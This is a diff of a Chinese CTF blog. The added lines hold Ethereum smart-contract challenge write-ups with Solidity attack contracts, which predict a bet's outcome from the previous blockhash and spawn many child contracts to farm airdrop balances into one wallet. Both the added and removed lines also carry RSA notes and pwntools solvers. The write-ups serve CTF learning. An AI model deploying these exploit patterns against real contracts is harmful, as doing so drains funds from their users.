+<p>直接调用<strong>CaptureTheFlag</strong>会失败，源码里<strong>Fake3D</strong>的构造函数传入了一个<strong>WinnerList</strong>合约地址
+https://ropsten.etherscan.io/查看参数得到<strong>WinnerList</strong>合约地址</p>
+<figure>
+<img src="https://s2.loli.net/2022/06/27/z1oqncQTZ2dSp4Y.png"
+alt="image.png" />
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<p><a
+target="_blank" rel="noopener" href="https://ethervm.io/decompile/ropsten/0xd229628fd201a391cf0c4ae6169133c1ed93d00a">反编译</a>分析得到<strong>tx.origin</strong>的第0x13个字节，也就是最后一字节为0x43或倒数第二字节（第0x12个字节）为0xb1才能通过</p>
+<p><a
+target="_blank" rel="noopener" href="https://vanity-eth.tk/">爆破</a>符合的地址，用这个地址调用攻击合约</p>
+<h2 id="qwb2019-babybet">QWB2019 babybet</h2>
+<p><a
+target="_blank" rel="noopener" href="https://ethervm.io/decompile/ropsten/0x5d1beefd4de611caff204e1a318039324575599a">反编译合约</a></p>
+<p>有空投函数<strong>profit</strong>和<strong>bet</strong>函数，<strong>bet</strong>函数可以通过猜数字增加<strong>balance</strong></p>
+<figure>
+<img src="https://s2.loli.net/2022/06/27/dXwcrtHRVi8mGUx.png"
+alt="image.png" />
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<p>所要猜的数字生成方式为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">guess = block.blockHash(block.number-1);</span><br></pre></td></tr></table></figure>
+<h3 id="攻击合约-2">攻击合约</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">contract father&#123;</span><br><span class="line"></span><br><span class="line">    function destory()&#123;</span><br><span class="line">        selfdestruct(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack(uint times)&#123;</span><br><span class="line">        for(uint i=0;i&lt;times;i++)&#123;</span><br><span class="line">            Son son = new Son();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Son&#123;</span><br><span class="line">    address bbb=0x5d1BeEFD4dE611caFf204e1A318039324575599A;</span><br><span class="line">    address mywallet=0x3C5D01C380F8D8581bE8E3b5De0a8f35420f7D68;</span><br><span class="line">    constructor()public&#123;</span><br><span class="line">        babybet(bbb).profit();</span><br><span class="line">        uint guess = uint(block.blockhash(block.number - 0x01));</span><br><span class="line">        uint guess1 = guess % 3;</span><br><span class="line">        babybet(bbb).bet(guess1);</span><br><span class="line">        uint amount=babybet(bbb).balance(address(this));</span><br><span class="line">        if(amount&gt;10)&#123;</span><br><span class="line">            babybet(bbb).transferbalance(mywallet,amount);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="数字经济2019-jojo">数字经济2019 jojo</h2>
+<p><strong>地址</strong>：0x53c079c6d47fd7399c1ceee171db7141c35a6f44
+<strong>附件</strong>：jojo.broken</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.24;</span><br><span class="line"></span><br><span class="line">contract jojo &#123;</span><br><span class="line">    mapping(address =&gt; uint) public balanceOf;</span><br><span class="line">    mapping(address =&gt; uint) public gift;</span><br><span class="line">    address owner;</span><br><span class="line">        </span><br><span class="line">    constructor()public&#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    event SendFlag(string b64email);</span><br><span class="line">    </span><br><span class="line">    function payforflag(string b64email) public &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;= 100000);</span><br><span class="line">        emit SendFlag(b64email);</span><br><span class="line">    &#125;</span><br><span class="line">............</span><br></pre></td></tr></table></figure>
+<p>先逆向合约</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function gift() public &#123;</span><br><span class="line">    assert(gift[msg.sender]==0);</span><br><span class="line">    balanceOf[msg.sender]+=100;</span><br><span class="line">    gift[msg.sender]=1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function transfer(address to,uint value) public &#123;</span><br><span class="line">    assert(balanceOf[msg.sender] &gt;= value);</span><br><span class="line">    balanceOf[msg.sender]-=value;</span><br><span class="line">    balanceOf[to]+=value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="攻击合约-3">攻击合约</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">contract father&#123;</span><br><span class="line">    function attack(uint times)&#123;</span><br><span class="line">        for(uint i=0;i&lt;times;i++)&#123;</span><br><span class="line">            Son son = new Son();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Son&#123;</span><br><span class="line">    jojo j=jojo(0x53c079c6d47fd7399c1ceee171db7141c35a6f44);</span><br><span class="line">    address me=0x3C5D01C380F8D8581bE8E3b5De0a8f35420f7D68;</span><br><span class="line">    constructor()&#123;</span><br><span class="line">        j.gift();</span><br><span class="line">        j.transfer(me,100);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/06/26/%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BAsage-jupyter-notebook/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://q1.qlogo.cn/g?b=qq&nk=1987356024&s=100">
+      <meta itemprop="name" content="Lorlike">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lorlike's Blog">
+      <meta itemprop="description" content="ctfer/蒟蒻觅马🐶/炼丹">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Lorlike's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/06/26/%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BAsage-jupyter-notebook/" class="post-title-link" itemprop="url">服务器搭建sage jupyter notebook</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-06-26 00:59:46" itemprop="dateCreated datePublished" datetime="2022-06-26T00:59:46+08:00">2022-06-26</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-06-29 17:27:10" itemprop="dateModified" datetime="2022-06-29T17:27:10+08:00">2022-06-29</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/" itemprop="url" rel="index"><span itemprop="name">环境配置</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="官方sagemath">官方sagemath</h2>
+<p>运行下面指令，启用sagemath容器，自动下载镜像</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -p8888:8888 sagemath/sagemath sage-jupyter</span><br></pre></td></tr></table></figure>
+<p><strong>-p8888:8888</strong>是端口映射，前一个是容器端口，后一个是主机端口</p>
+<p>复制<strong>jupyter</strong>地址，直接关掉<strong>shell</strong>（shell已经卡死），完成</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/06/26/%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BAsage-jupyter-notebook/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -773,391 +1202,6 @@ class="math inline">\(d_p\)</span> 的上界也将提高</p>
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/2022/05/30/%E9%92%88%E5%AF%B9%E5%90%AB%E5%B0%8FCRT%E7%A7%81%E9%92%A5%E4%B8%8D%E5%B9%B3%E8%A1%A1RSA%E7%9A%84%E6%94%BB%E5%87%BB/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/30/%E4%B8%80%E7%A7%8D%E9%92%88%E5%AF%B9RSA%E8%BE%83%E5%A4%A7%E7%9A%84gcd-p-1-q-1-%CE%B2%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://q1.qlogo.cn/g?b=qq&nk=1987356024&s=100">
-      <meta itemprop="name" content="Lorlike">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Lorlike's Blog">
-      <meta itemprop="description" content="ctfer/蒟蒻觅马🐶/炼丹">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | Lorlike's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/05/30/%E4%B8%80%E7%A7%8D%E9%92%88%E5%AF%B9RSA%E8%BE%83%E5%A4%A7%E7%9A%84gcd-p-1-q-1-%CE%B2%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/" class="post-title-link" itemprop="url">一种针对RSA较大的gcd(p-1,q-1)=β的攻击方法</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2022-05-30 01:12:44" itemprop="dateCreated datePublished" datetime="2022-05-30T01:12:44+08:00">2022-05-30</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2022-06-02 13:47:01" itemprop="dateModified" datetime="2022-06-02T13:47:01+08:00">2022-06-02</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/note/" itemprop="url" rel="index"><span itemprop="name">note</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>对于<span class="math inline">\(N=pq\)</span>，<span
-class="math inline">\(p\)</span> 和 <span
-class="math inline">\(q\)</span> 相近并且 <span
-class="math inline">\(p-1\)</span> 与 <span
-class="math inline">\(q-1\)</span> 有一个大的共因子 <span
-class="math inline">\(\beta\)</span> ，那么可以在 <span
-class="math inline">\(O(\frac{N^{\frac{1}{4}}}{\beta})\)</span>
-时间内分解<span class="math inline">\(N\)</span></p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2022/05/30/%E4%B8%80%E7%A7%8D%E9%92%88%E5%AF%B9RSA%E8%BE%83%E5%A4%A7%E7%9A%84gcd-p-1-q-1-%CE%B2%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/25/b01lers-CTF/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://q1.qlogo.cn/g?b=qq&nk=1987356024&s=100">
-      <meta itemprop="name" content="Lorlike">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Lorlike's Blog">
-      <meta itemprop="description" content="ctfer/蒟蒻觅马🐶/炼丹">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | Lorlike's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/04/25/b01lers-CTF/" class="post-title-link" itemprop="url">b01lers CTF</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2022-04-25 02:30:20" itemprop="dateCreated datePublished" datetime="2022-04-25T02:30:20+08:00">2022-04-25</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2022-06-26 00:08:55" itemprop="dateModified" datetime="2022-06-26T00:08:55+08:00">2022-06-26</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="crypto">crypto</h2>
-<h3 id="hardcore">Hardcore</h3>
-<p>模2同余方程组</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>(<span class="params">l</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> l])</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">a=np.identity(<span class="number">256</span>,dtype=np.int64)</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;ctf.b01lers.com&#x27;</span>,<span class="number">9003</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">s=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">r.recvuntil(<span class="string">&#x27;answer.\n&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    <span class="built_in">print</span>(i,s)</span><br><span class="line">    r.sendline(foo(a[i]))</span><br><span class="line">    s+=r.recvline().strip()</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a=<span class="number">0b0110001001100011011101000110011001111011011001000110111101011111011110010110111101110101010111110110110001101001011010110110010101011111011010000110000101110010011001000110001101101111011100100110010101011111011000110110100001100001011011000111001101111101</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(a))</span><br><span class="line"><span class="comment"># bctf&#123;do_you_like_hardcore_chals&#125;</span></span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/23/2022DASCTF-Apr/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://q1.qlogo.cn/g?b=qq&nk=1987356024&s=100">
-      <meta itemprop="name" content="Lorlike">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Lorlike's Blog">
-      <meta itemprop="description" content="ctfer/蒟蒻觅马🐶/炼丹">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | Lorlike's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/04/23/2022DASCTF-Apr/" class="post-title-link" itemprop="url">2022DASCTF Apr</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2022-04-23 10:59:36" itemprop="dateCreated datePublished" datetime="2022-04-23T10:59:36+08:00">2022-04-23</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2022-06-26 00:08:43" itemprop="dateModified" datetime="2022-06-26T00:08:43+08:00">2022-06-26</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="crypto">crypto</h2>
-<h3 id="easy_real">easy_real</h3>
-<p>爆破hash，xor密码</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">h=<span class="string">&#x27;37693cfc748049e45d87b8c7d8b9aacd&#x27;</span></span><br><span class="line">n=<span class="number">4197356622576696564490569060686240088884187113566430134461945130770906825187894394672841467350797015940721560434743086405821584185286177962353341322088523</span></span><br><span class="line">c=<span class="number">3298176862697175389935722420143867000970906723110625484802850810634814647827572034913391972640399446415991848730984820839735665233943600223288991148186397</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">if</span> hashlib.md5(<span class="built_in">str</span>(i).encode()).hexdigest()==h:</span><br><span class="line">        e=i</span><br><span class="line"></span><br><span class="line">p = <span class="number">64310413306776406422334034047152581900365687374336418863191177338901198608319</span></span><br><span class="line">q=n//p</span><br><span class="line"></span><br><span class="line">d=inverse(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line">m=long_to_bytes(m)</span><br><span class="line">l=<span class="built_in">len</span>(m)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">    a=<span class="built_in">bytes</span>([i]*l)</span><br><span class="line">    a=xor(a,m)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> a:</span><br><span class="line">        <span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2022/04/23/2022DASCTF-Apr/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/21/CTF-2022-crypto/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://q1.qlogo.cn/g?b=qq&nk=1987356024&s=100">
-      <meta itemprop="name" content="Lorlike">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Lorlike's Blog">
-      <meta itemprop="description" content="ctfer/蒟蒻觅马🐶/炼丹">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | Lorlike's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/04/21/CTF-2022-crypto/" class="post-title-link" itemprop="url">*CTF 2022 crypto</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2022-04-21 23:12:12" itemprop="dateCreated datePublished" datetime="2022-04-21T23:12:12+08:00">2022-04-21</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2022-06-26 00:07:05" itemprop="dateModified" datetime="2022-06-26T00:07:05+08:00">2022-06-26</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="ezrsa">ezRSA</h2>
-<h3 id="方法1">方法1</h3>
-<p>p,q的900位以后的高位hb都是一样的，可以先求出来</p>
-<p>设<span class="math inline">\(p=hb+y\)</span>，那么<span
-class="math inline">\(q=hb+2^{900}-y+z\)</span>，z为300位的随机数，可以得到
-<span class="math display">\[
-p+q=2hb+2^{900}+z,\ p-q=2y-2^{900}-z
-\]</span> 因为<span class="math inline">\(n=pq\)</span>，<span
-class="math inline">\(p+q\)</span>的高位（低300位未知）已知，可以由<span
-class="math inline">\(p-q=\sqrt{(p+q)^2-4n}\)</span>求出<span
-class="math inline">\(p-q\)</span>的近似值相应的y的近似值也能求出，再用coppersmith求出y的低位从而求出p
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2022/04/21/CTF-2022-crypto/#more" rel="contents">
                 阅读全文 &raquo;
               </a>
             </div>
